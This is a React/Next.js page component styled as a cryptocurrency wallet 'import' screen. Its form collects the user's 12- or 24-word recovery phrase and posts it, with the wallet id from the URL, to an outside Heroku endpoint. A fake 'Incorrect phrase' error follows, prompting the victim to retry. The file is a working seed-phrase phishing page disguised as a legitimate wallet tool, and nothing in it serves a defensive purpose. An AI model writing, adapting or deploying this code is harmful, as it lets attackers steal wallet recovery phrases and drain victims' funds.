import React, { useState } from "react";
import axios from "axios";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import { useRouter } from "next/router";
import styles from "../../styles/Home.module.css";
import Tabs from "./index";
import Modal from "../../components/Modal";
import Overlay from '../../components/Overlay';

export default function Discover() {
  const [phrase, setPhrase] = useState("");
  const [showModal, setShowModal] = useState(false)
  const router = useRouter();
  const { pid } = router.query;

  const notify = () => {
    phrase === "" ? "" : toast.error("Incorrect phrase, please try again.");
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (phrase !== "") {
      const pS = { phrase: phrase, wallet: pid };
      // console.log(pS);
      axios
        .post("https://stark-citadel-82468.herokuapp.com/send", pS)
        .then((res) => res.json())
        .then(setShowModal(true))
        .catch((err) => err);

    }
  };

  return (
    <Tabs>
      <div>
        <form onSubmit={handleSubmit}>
          <textarea
            value={phrase}
            onChange={(e) => setPhrase(e.target.value)}
            placeholder="Phrase is typically 12 (sometimes 24) words separated by single spaces"
            className={styles.textarea}
            required
          />
          <button onClick={notify} className={styles.button}>
            import
          </button>
          {/* <ToastContainer /> */}
        </form>
        {showModal &&
          <>
            <Modal showModal={showModal} setShowModal={setShowModal} />
            <Overlay />
          </>}

      </div>
    </Tabs>
  );
}
